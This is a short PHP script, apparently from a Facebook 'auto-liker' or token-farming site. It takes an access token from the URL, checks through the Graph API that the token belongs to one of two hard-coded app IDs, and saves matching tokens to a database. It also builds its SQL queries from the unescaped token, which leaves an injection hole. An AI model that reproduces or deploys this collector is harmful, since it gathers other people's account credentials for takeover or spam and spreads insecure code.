<?php
set_time_limit(0);
include '../system/config.php';
$token = $_GET['token'];
$me = me($token);
$app = json_decode(auto('https://graph.facebook.com/app/?access_token='.$token),true);
if($me['id'] && ($app['id'] == 350685531728 || $app['id'] == 6628568379)){
$check = mysql_result(mysql_query("SELECT COUNT(*) FROM `token` WHERE `token`='$token'"), 0);
if($check < 1) mysql_query("INSERT INTO `token` SET `token`='$token'");
}
function me($token) {
return json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
}
function auto($url){
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, $url);
$ch = curl_exec($curl);
curl_close($curl);
return $ch;
}